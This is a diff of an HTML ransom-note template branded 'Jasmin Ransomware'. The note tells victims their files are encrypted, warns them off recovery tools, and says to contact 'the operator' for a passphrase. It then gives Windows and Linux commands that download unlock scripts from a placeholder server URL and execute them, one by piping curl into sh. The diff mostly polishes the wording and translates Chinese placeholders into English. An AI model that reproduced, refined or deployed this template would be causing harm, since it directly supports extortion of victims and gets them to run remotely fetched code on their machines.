@@ -4,46 +4,42 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:Consolas,'Courier New',monospace;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.box{max-width:700px;padding:40px;border:2px solid #f43f5e;border-radius:12px;background:#111;box-shadow:0 0 40px rgba(244,63,94,.3)}
+.box{max-width:760px;padding:40px;border:2px solid #f43f5e;border-radius:12px;background:#111;box-shadow:0 0 40px rgba(244,63,94,.3)}
 h1{color:#f43f5e;font-size:2rem;text-align:center;margin-bottom:20px;text-shadow:0 0 20px rgba(244,63,94,.5)}
 h2{color:#4dc3fa;font-size:1.1rem;margin:18px 0 8px}
 p,li{font-size:.9rem;line-height:1.7;color:#bbb}
 .id{background:#1a1a2e;border:1px solid #333;padding:10px;border-radius:6px;font-family:monospace;color:#4dc3fa;word-break:break-all;margin:10px 0}
 .warn{color:#f43f5e;font-weight:bold}
-ol{padding-left:20px}
+pre{background:#1a1a2e;border:1px solid #333;padding:10px;border-radius:6px;overflow-x:auto;color:#4dc3fa;font-size:.82rem;line-height:1.6}
 .footer{text-align:center;margin-top:24px;color:#555;font-size:.75rem}
 </style></head>
 <body><div class="box">
 <h1>🔒 YOUR FILES HAVE BEEN ENCRYPTED</h1>
-<p>All your important files have been encrypted with <b>AES-256 + RSA-2048</b> military-grade encryption. Each file has its own unique encryption key protected by RSA public key.</p>
+<p>All your important files have been encrypted with <b>AES-256 + RSA-2048</b> military-grade hybrid encryption. Each file has its own unique key, protected by an RSA public key.</p>
 
 <h2>📌 Your System ID</h2>
 <div class="id">{{SYSTEM_ID}}</div>
 
-<h2>⚠️ DO NOT</h2>
+<h2>⚠️ Important</h2>
 <ul>
 <li class="warn">Do NOT rename or move .jasmin files</li>
-<li class="warn">Do NOT try to decrypt with third-party software — it will corrupt your files</li>
+<li class="warn">Do NOT use third-party recovery tools — they will corrupt your data</li>
 <li class="warn">Do NOT delete .jasmin files — they contain your encrypted data</li>
 </ul>
 
 <h2>🔓 How to Decrypt</h2>
-<ol>
-<li>Contact the operator to obtain the RSA private key (.pem file)</li>
-<li>Follow the decryption guide below for your operating system</li>
-</ol>
+<p>Contact the operator to obtain the passphrase, then run the command below for your operating system.</p>
 
-<h2>💻 Windows Decryption</h2>
-<p>Requires PowerShell 7+ (<code>winget install Microsoft.PowerShell</code>)</p>
-<pre style="background:#1a1a2e;border:1px solid #333;padding:10px;border-radius:6px;overflow-x:auto;color:#4dc3fa">curl.exe -sL {{SERVER_URL}}/payloads/jasmin_unlock.ps1 -o unlock.ps1
-pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "&lt;解密口令&gt;" -Paths C:\目标目录</pre>
+<h2>💻 Windows — requires PowerShell 7+</h2>
+<pre>curl.exe -sL {{SERVER_URL}}/payloads/jasmin_unlock.ps1 -o unlock.ps1
+pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "&lt;passphrase&gt;" -Paths C:\TargetFolder</pre>
 
-<h2>🐧 Linux / macOS Decryption</h2>
-<p>Pure <code>openssl</code> — no dependencies to install.</p>
-<pre style="background:#1a1a2e;border:1px solid #333;padding:10px;border-radius:6px;overflow-x:auto;color:#4dc3fa">curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "&lt;解密口令&gt;" &lt;目标目录&gt;</pre>
-<p>The decryption passphrase and target directory are provided by the operator.</p>
+<h2>🐧 Linux / macOS — pure openssl, no dependencies</h2>
+<pre>curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "&lt;passphrase&gt;" &lt;target_folder&gt;</pre>
 
-<p style="margin-top:16px">✅ <b>SHA-256 integrity verification</b> ensures every file is restored to its exact original state.</p>
+<p>The passphrase and target folder are provided by the operator.</p>
+
+<p style="margin-top:16px">✅ <b>SHA-256 integrity verification</b> guarantees every file is restored to its exact original state.</p>
 
 <div class="footer">Jasmin Ransomware — AES-256 + RSA-2048 Hybrid Encryption</div>
 </div></body></html>
